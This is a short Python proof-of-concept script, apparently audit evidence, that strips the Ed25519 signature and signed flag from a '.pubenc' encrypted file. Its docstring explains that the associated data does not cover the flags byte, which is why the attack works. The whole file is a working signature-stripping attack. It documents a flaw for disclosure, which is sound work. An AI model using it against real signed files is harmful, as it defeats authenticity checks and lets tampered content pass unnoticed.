#!/usr/bin/env python3
"""Strip the embedded Ed25519 signature from a signed .pubenc file (audit evidence).

Clears the PUBENC_FLAG_HAS_SIGNATURE bit and removes the vk+sig block.
The AEAD still verifies because neither the flags byte nor the signature
block is covered by the AAD (the AAD still contains the original sig_vk
string, but the tool never cross-checks it against the flags).

Usage: poc_strip.py <signed_in.pubenc> <out.pubenc>
"""
import sys

data = open(sys.argv[1], "rb").read()
assert data[:5] == b"SCFv1", "not a pubenc file"
assert data[5] & 1, "file is not signed"
rest = data[6 + 96:]  # skip magic + flags + vk(32) + sig(64)
out = b"SCFv1" + b"\x00" + rest
open(sys.argv[2], "wb").write(out)
print(f"[strip] {sys.argv[1]} -> {sys.argv[2]}: {len(data)} -> {len(out)} bytes")
